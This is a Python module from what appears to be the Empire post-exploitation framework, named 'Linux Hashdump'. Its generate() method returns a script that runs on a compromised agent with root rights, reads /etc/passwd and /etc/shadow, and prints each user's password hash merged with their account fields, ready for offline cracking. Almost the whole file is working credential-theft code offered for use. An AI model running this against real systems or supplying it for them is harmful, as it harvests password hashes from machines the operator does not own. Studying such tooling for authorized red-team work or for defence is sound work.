from lib.common import helpers
import pdb
class Module:
    def __init__(self, mainMenu, params=[]):
        self.info = {
            'Name': 'Linux Hashdump',
            'Author': ['@harmj0y'],
            'Description': ("Extracts the /etc/passwd and /etc/shadow, unshadowing the result."),
            'Background' : False,
            'OutputExtension' : "",
            'NeedsAdmin' : True,
            'OpsecSafe' : True,
            'Language' : 'python',
            'MinLanguageVersion' : '2.6',
            'Comments': []
        }
        self.options = {
            'Agent' : {
                'Description'   :   'Agent to execute module on.',
                'Required'      :   True,
                'Value'         :   ''
            }
        }
        self.mainMenu = mainMenu
        if params:
            for param in params:
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value
    def generate(self, obfuscate=False, obfuscationCommand=""):
        script = """
f = open("/etc/passwd")
passwd = f.readlines()
f.close()
f2 = open("/etc/shadow")
shadow = f2.readlines()
f2.close()
users = {}
for line in shadow:
    parts = line.strip().split(":")
    username, pwdhash = parts[0], parts[1]
    users[username] = pwdhash
for line in passwd:
    parts = line.strip().split(":")
    username = parts[0]
    info = ":".join(parts[2:])
    if username in users:
        print "%s:%s:%s" %(username, users[username], info)
"""
        return script